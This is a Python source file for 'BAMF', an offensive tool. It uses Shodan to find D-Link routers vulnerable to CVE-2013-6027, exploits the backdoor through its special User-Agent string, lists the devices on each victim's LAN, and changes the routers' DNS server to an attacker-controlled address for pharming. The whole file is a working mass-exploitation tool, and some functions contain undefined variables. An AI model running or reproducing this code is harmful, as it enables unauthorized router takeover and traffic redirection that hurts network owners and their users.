#!/usr/bin/env python
'BAMF (Backdoor Access Malvertising Framework)'

__version__ = '0.1.2'
__license__ = 'GPLv3'
__author__ = 'Daniel Vega-Myhre'
__github__ = 'https://github.com/malwaredllc/bamf'

# standard library
import os
import sys
import socket
import pprint
import getopt
import logging
import sqlite3
import urllib2
import argparse
import tempfile

# packages
import shodan
import colorama
import mechanize


class Bamf(mechanize.Browser):

    """
    Virtual browser capable of spidering through the web
    looking for administration panels for D-Link routers
    vulnerable to CVE-2013-6027 and changing their DNS
    server settings

    """

    __tbl_routers = """BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS tbl_routers (
    ip varchar(15) DEFAULT NULL,
    port tinyint(3) DEFAULT NULL,
    model text DEFAULT NULL,
    vulnerability text DEFAULT NULL,
    signature text DEFAULT NULL,
    dns varchar(15) DEFAULT NULL
);
COMMIT;
"""

    __tbl_devices = """BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS tbl_devices (
    router varchar(15) DEFAULT NULL,
    device text DEFAULT NULL,
    ip varchar(15) DEFAULT NULL,
    mac varchar(16) DEFAULT NULL
);
COMMIT;
"""

    __signatures = [
       "admin_frm",
        "brl-04cw",
        "brl-04cw-u",
        "brl-04r",
        "brl-04ur",
        "brl-04ur",
        "brl04ur",
        "di-524",
        "di-524",
        "di-524up",
        "di-524up",
        "di-604+",
        "di-604up",
        "di-615",
        "di-624s",
        "di524up",
        "di615",
        "di624s",
        "dir-524",
        "dir-524up",
        "dir-604+",
        "dir-604up",
        "dir-615",
        "dir-624s",
        "dir524",
        "dir604+",
        "dir615",
        "dlink_firmware_v1.0",
        "h_wizard.htm",
        "help.htm",
        "home/h_wizard.htm",
        "httpd-alphanetworks/2.23",
        "index.htm",
        "index1.htm",
        "menu.htm",
        "settings saved",
        "thttpd alphanetworks 2.23",
        "thttpd-alphanetworks 2.23",
        "thttpd-alphanetworks 2.23",
        "thttpd-alphanetworks/2.23",
        "tm-5240",
        "tm-g5240",
        "tm-g5240",
        "tm-g5240",
        "tm5240",
        "tmg5240",
        "tools_admin.htm",
        "tools_admin.xgi"
        ]

    __vulnerability = 'CVE-2013-6027'

    def __init__(self, database='database.db', api_key=None):
        """
        Initialize a new Bamf instance

        `Optional`
        :param str database:    SQLite database
        :param str api_key:     Shodan API key

        """
        mechanize.Browser.__init__(self)
        self._targets = {}
        self._models = {}
        self._backdoors = []
        self._devices = []
        self._query = 'alphanetworks/2.23'
        self._database = sqlite3.connect(database)
        self._database.executescript(self.__tbl_routers)
        self._database.executescript(self.__tbl_devices)
        self._shodan = shodan.Shodan(api_key) if isinstance(api_key, str) else None
        self.addheaders = [('User-Agent', 'xmlset_roodkcableoj28840ybtide')]
        self.set_handle_robots(False)
        self.set_handle_redirect(True)
        self.set_handle_refresh(True)
        self.set_handle_equiv(True)
        self.set_handle_referer(True)
        self.set_debug_http(False)
        self.set_debug_responses(False)

    def _save(self):
        for device in self._devices:
            _ = self._database.execute("INSERT INTO tbl_devices (router, device, ip, mac) VALUES (:router, :device, :ip, :mac)", device)
        for backdoor in self._backdoors:
            _ = self._database.execute("INSERT INTO tbl_routers (ip, port, model, vulnerability, signature) VALUES (:ip, :port, :model, :vulnerability, :signature)", backdoor)
        self._database.commit()

    def _pharm(self, ip, port, dns):
        url = 'http://{}:{}/Home/h_wan_dhcp.htm'.format(ip, port)
        request = self.open(url, timeout=3.0)
        form = self.select_form("wan_form")
        self['dns1'] = dns
        self.submit()
        self._save()
 
    def _map(self, ip, port):
        request = self.open('http://{}:{}/Home/h_dhcp.htm'.format(ip, port), timeout=3.0)
        html = request.get_data().splitlines()
        for line in html:
            try:
                parts = line.split('","')
                if len(parts) >= 3 and valid_ip(parts[1]):
                    if 'ist=[' not in line and 'erver=[' not in line:

                        name = parts[0].strip('["')
                        lan_ip = parts[1]
                        mac = parts[2]
                        lan_device = {"router": ip, "device": name, "ip": lan_ip, "mac": mac}

                        self._devices.append(lan_device)

                        print('  |')
                        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + '[+]' + colorama.Fore.RESET + ' Device {}'.format(len(self._devices)) + colorama.Style.NORMAL)
                        print('  |   Device Name: ' + colorama.Style.DIM + name + colorama.Style.NORMAL)
                        print('  |   Internal IP: ' + colorama.Style.DIM + lan_ip + colorama.Style.NORMAL)
                        print('  |   MAC Address: ' + colorama.Style.DIM + mac + colorama.Style.NORMAL)

            except Exception as e:
                debug(str(e))

    def _scan(self, ip, port):
        target = 'http://{}:{}'.format(ip, port)
        debug("Requesting {}...".format(target))
        try:
            conn = self.open(target, timeout=2.0)
            html = conn.get_data()

            if not html or not self.viewing_html():
                return

            elif conn.code == 200:
                for signature in self.__signatures:
                    if signature in html:

                        model = str(self.title())

                        self._backdoors.append({"ip": ip, "port": port, "model": model, "vulnerability": self.__vulnerability, "signature": signature})

                        print("  | ")
                        print("  |      " +  colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + " Backdoor {}".format(str(len(self._backdoors))) + colorama.Style.NORMAL)
                        print("  |      IP: " + colorama.Style.DIM + ip + colorama.Style.NORMAL)
                        print("  |      Port: " + colorama.Style.DIM + "{}/tcp".format(port) + colorama.Style.NORMAL)
                        print("  |      Model: " + colorama.Style.DIM + model + colorama.Style.NORMAL)
                        print("  |      Vulnerability: " + colorama.Style.DIM + self.__vulnerability + colorama.Style.NORMAL)
                        print("  |      Signature: " + colorama.Style.DIM + signature + colorama.Style.NORMAL)

            else:
                return

        except Exception as e:
            debug(str(e))

    def pharm(self, dns):
        """
        Change the primary DNS server of vulnerable routers

        `Required`
        :param str dns:     IP address of a user-controlled DNS server

        """
        if not len(self._backdoors):
            error("no backdoored routers to pharm (use 'scan' to detect vulnerable targets)")
        elif not valid_ip(dns):
            error("invalid IP address entered for DNS server")
        else:
            for i, router in enumerate(self._backdoors):

                self._pharm(router['ip'], router['port'], dns)

                devices = self._database.execute("SELECT (SELECT count() from tbl_devices WHERE router=:router) as count", {"router": ip}).fetchall()[0][0]

                print(colorama.Fore.MAGENTA + colorama.Style.NORMAL + '[+]' + colorama.Fore.RESET + ' Router {}:{} - DNS Server Modified'.format(ip, port))
                print('  |   DNS Server:   ' + colorama.Style.DIM + '{}:53'.format(dns) + colorama.Style.NORMAL)
                print('  |   Connected Devices: ' + colorama.Style.DIM + '{}\n'.format(size) + colorama.Style.NORMAL)

    def scan(self, *args):
        """
        Scan target hosts for signatures of a backdoor

        `Optional`
        :param str ip:      IP address of target router
        :param int port:    Port number of router administration panel

        """
        print("\nScanning {} targets...".format(len(self._targets)))
        startlen = len(self._backdoors)

        if len(args):
            ip, _, port = args[0].partition(' ')

            if valid_ip(ip) and port.isdigit(port):
                self._targets[ip] = int(port)
                self._scan(ip, port)
                print(colorama.Fore.CYAN + "\n[+]" + colorama.Fore.RESET + " Scan complete - " + colorama.Style.BRIGHT + "1" + colorama.Style.NORMAL + " backdoor(s) found\n")
            else:
                error("invalid IP address or port number")
        else:
            if len(self._targets):
                for ip, port in self._targets.items():
                    self._scan(ip, port)
                print(colorama.Fore.CYAN + "\n[+]" + colorama.Fore.RESET + " Scan complete - " + colorama.Style.BRIGHT + str(len(self._backdoors) - startlen) + colorama.Style.NORMAL + " backdoor(s) found\n")
            else:
                error("no targets to scan")
                self.help()

        self._save()

    def map(self, *args):
        """
        Discover devices connected in local networks of backdoored routers

        `Optional`
        :param str ip:      IP address of target router
        :param int port:    Port number of router administration panel

        """
        if not len(self._backdoors):
            error('no backdoored routers with local networks to map')

        if len(args):
            ip, _, port = args[0].partition(' ')
            if not valid_ip(ip):
                error("invalid IP address")
            elif not port.isdigit() or not (0 < int(port) < 65356):
                error("invalid port number")
            else:
                self._map(ip, int(port))
                self._save()
        else:
            for backdoor in self._backdoors:
                print('\nMapping Network {}...\n'.format(self._backdoors.index(backdoor) + 1))
                self._map(backdoor['ip'], backdoor['port'])
            self._save()

    def search(self, *args):
        """
        Utilize the IoT search-engine, Shodan, to search for vulnerable routers

        """
        if len(args):
            self._query = str(args[0])

        if isinstance(self._shodan, shodan.Shodan):

            print('\nSearching Shodan for vulnerable routers...')

            n = self._shodan.count(self._query)['total']

            print('\nShodan found {} potential target hosts'.format(n))

            cmd = prompt('Add hosts to targets','y','n','#').lower()

            if cmd.startswith('n'):
                return
            else:
                for i, item in enumerate(self._shodan.search_cursor(self._query)):

                    ip = item.get('ip_str').encode()
                    port = item.get('port')
                    self._targets[ip] = port

                    if cmd.isdigit() and i + 1 == int(cmd):
                        break

                print("\nAdded {} new targets\n".format(i + 1))

        else:
            error("search requires Shodan API key")

    def help(self, *args):
        """
        Show usage information

        """
        print('\n' + colorama.Fore.YELLOW + colorama.Style.BRIGHT + '   COMMAND             DESCRIPTION' + colorama.Fore.RESET + colorama.Style.NORMAL)
        print('   search           ' + colorama.Style.DIM + '   query the Shodan IoT search engine for targets' + colorama.Style.NORMAL)
        print('   scan [ip] [port] ' + colorama.Style.DIM + '   scan target host(s) for backdoors' + colorama.Style.NORMAL)
        print('   map [ip] [port]  ' + colorama.Style.DIM + '   map local network(s) of vulnerable routers' + colorama.Style.NORMAL)
        print('   pharm <dns>      ' + colorama.Style.DIM + '   modify the dns server of vulnerable routers' + colorama.Style.NORMAL)
        print('   targets          ' + colorama.Style.DIM + '   show current targets' + colorama.Style.NORMAL)
        print('   backdoors        ' + colorama.Style.DIM + '   show backdoors detected this sessions' + colorama.Style.NORMAL)
        print('   devices          ' + colorama.Style.DIM + '   show devices connected to backdoored routers'+ colorama.Style.NORMAL)
        print('   exit/quit        ' + colorama.Style.DIM + '   end session and exit program\n' + colorama.Style.NORMAL)

    def backdoors(self, *args):
        """
        Show all detected backdoors

        """
        pprint.pprint(self._backdoors)
        print(colorama.Fore.MAGENTA + '\n[+] ' + colorama.Style.BRIGHT + colorama.Fore.RESET + str(len(self._backdoors)) + colorama.Style.NORMAL + ' backdoors confirmed\n')

    def targets(self, *args):
        """
        Show all target hosts

        """
        pprint.pprint(self._targets)
        print(colorama.Fore.GREEN + '\n[+] ' + colorama.Style.BRIGHT + colorama.Fore.RESET + str(len(self._targets)) + colorama.Style.NORMAL + ' targets ready to scan\n')

    def devices(self, *args):
        """
        Show all discovered devices connected to vulnerable routers

        """
        pprint.pprint(self._devices)
        print(colorama.Fore.CYAN + '\n[+] ' + colorama.Style.BRIGHT + colorama.Fore.RESET + str(len(self._devices)) + colorama.Style.NORMAL + ' devices connected to vulnerable routers\n')

    def quit(self, *args):
        """
        End the session and exit BAMF

        """
        sys.exit(0)

    def exit(self, *args):
        """
        End the session and exit BAMF

        """
        sys.exit(0)

    def run(self):
        """
        Run BAMF

        """
        while True:
            try:
                cmd, _, arg = raw_input(colorama.Style.BRIGHT + "[bamf]> " + colorama.Style.NORMAL).partition(' ')
                if hasattr(self, cmd):
                    getattr(self, cmd)(arg) if len(arg) else getattr(self, cmd)()
                else:
                    debug("unknown command: '{}' (use 'help' for usage information)".format(cmd))
            except KeyboardInterrupt:
                sys.exit(0)
            self.run()

# utilities
def debug(msg):
    globals()['logger'].debug(str(msg))

def error(msg, color='RED'):
    print ('\n' + getattr(colorama.Fore, color)  + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.WHITE + 'Error - '   + colorama.Style.NORMAL + msg + '\n')

def warn(msg, color='YELLOW'):
    print ('\n' + getattr(colorama.Fore, color)  + colorama.Style.BRIGHT + '[!] ' + colorama.Fore.WHITE + 'Warning - ' + colorama.Style.NORMAL + msg + '\n')

def info(msg, color='GREEN'):
    print (getattr(colorama.Fore, color)  + colorama.Style.BRIGHT + '[+] ' + colorama.Fore.WHITE + colorama.Style.NORMAL  + msg)

def enter(msg, color='CYAN'):
    return raw_input('\n' + getattr(colorama.Fore, color) + colorama.Style.NORMAL + "[>] " + colorama.Fore.WHITE + msg + ': ').lower()

def prompt(q, *args, **kwargs):
    color = kwargs.get('color') if 'color' in kwargs else 'YELLOW'
    if len(args):
        return raw_input('\n' + colorama.Style.NORMAL + getattr(colorama.Fore, color) + "[?] " + colorama.Fore.WHITE + q + '? ' + '(' + '/'.join(args) + '): ').lower()
    else:
        return raw_input('\n' + colorama.Style.NORMAL + getattr(colorama.Fore, color) + "[?] " + colorama.Fore.WHITE + q + '?  ').lower()
    
def valid_ip(address):
    try:
        socket.inet_aton(address)
    except socket.error:
        return False
    return address.count('.') == 3

# main
def main():
    bamf = Bamf(api_key=options.shodan)
    bamf.run()


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        prog='bamf.py', 
        version='0.1.2', 
        description='Backdoor Access Machine Farmer')

    parser.add_argument(
        '--shodan',
        action='store',
        type=str,
        help='Shodan API key')

    parser.add_argument(
        '--debug',
        action='store_true',
        help='print debugging output to the console')

    options = parser.parse_args()

    logging.basicConfig(level=logging.DEBUG if options.debug else logging.ERROR, handler=logging.StreamHandler)
    logger = logging.getLogger(__name__)
    main()